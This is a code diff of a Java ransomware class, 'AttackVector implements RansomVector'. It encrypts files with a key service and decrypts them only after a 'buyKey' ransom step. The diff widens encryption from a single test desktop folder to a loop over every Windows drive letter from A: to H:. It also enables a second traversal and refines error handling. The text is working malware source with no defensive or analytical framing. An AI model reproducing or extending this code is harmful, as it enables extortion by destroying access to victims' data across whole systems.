@@ -18,15 +18,21 @@ import Agent.services.KeyService;
 import Agent.traversal.*;
 
 public class AttackVector implements RansomVector {
+	
 	private KeyService keyService;
+	private AlgorithmsMap algorithmMap;
+
+	public AttackVector() {
+		keyService = new KeyService();
+		algorithmMap = new AlgorithmsMap();
+	}
 
 	@Override
 	public void encryptFileSystem() throws AttackVectorException {
 		try {
-			keyService = new KeyService();
 			cryptFileSystem(keyService.getKey(), new EncryptFile());
 		} catch (CryptoException e) {
-			throw new AttackVectorException("Encrypting the file-system failed", e.getCause());
+			throw new AttackVectorException("Encrypting the file-system failed", e);
 		}
 	}
 
@@ -35,31 +41,26 @@ public class AttackVector implements RansomVector {
 		try {
 			cryptFileSystem(keyService.buyKey(), new DecryptFile());
 		} catch (CryptoException e) {
-			throw new AttackVectorException("Decrypting the file-system failed", e.getCause());
+			throw new AttackVectorException("Decrypting the file-system failed", e);
 		}
 	}
 
 	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws AttackVectorException {
-		// Traverse<File> dfs = new DFS<File>();
+		Traverse<File> dfs = new DFS<File>();
+		dfs.init();
 		// or
 		Traverse<File> bfs = new BFS<File>();
 		bfs.init();
 		Collection<File> visitedFolders = new ArrayList<File>();
 		// WINDOWS
-		// for (char i = 'A'; i <= 'H'; i++) {
-		try {
-			traverseAndCrypt("C:\\Users\\HP\\Desktop\\god", visitedFolders, key, bfs, cryptFunc);
-		} catch (CryptoException e) {
-			throw new AttackVectorException("Could not crypt the whole file-system", e.getCause());
+		for (char i = 'A'; i <= 'H'; i++) {
+			try {
+				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
+			} catch (CryptoException e) {
+				throw new AttackVectorException("Could not crypt the whole file-system", e);
+			}
 		}
-		// }
-		// UBUNTU
-		// try {
-		// traverseAndCrypt("/home/osher/Desktop", visitedFolders, key, bfs, cryptFunc);
-		// } catch (CryptoException e) {
-		// throw new AttackVectorException("Could not crypt the whole file-system",
-		// e.getCause());
-		// }
+
 	}
 
 	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
@@ -75,7 +76,7 @@ public class AttackVector implements RansomVector {
 	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
 			CryptoOperation cryptoFunc) throws CryptoException {
 
-		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
+		CryptoAlgorithm crypto = getCryptClass(algorithmMap.getMap(), key.getAlgorithm());
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
 			/* get next file/directory */
@@ -95,7 +96,7 @@ public class AttackVector implements RansomVector {
 						try {
 							cryptoFunc.operate(key, file, crypto);
 						} catch (CryptOperationException e) {
-							throw new CryptoException("Could not crypt", e.getCause());
+							throw new CryptoException("Could not crypt", e);
 						}
 
 					}
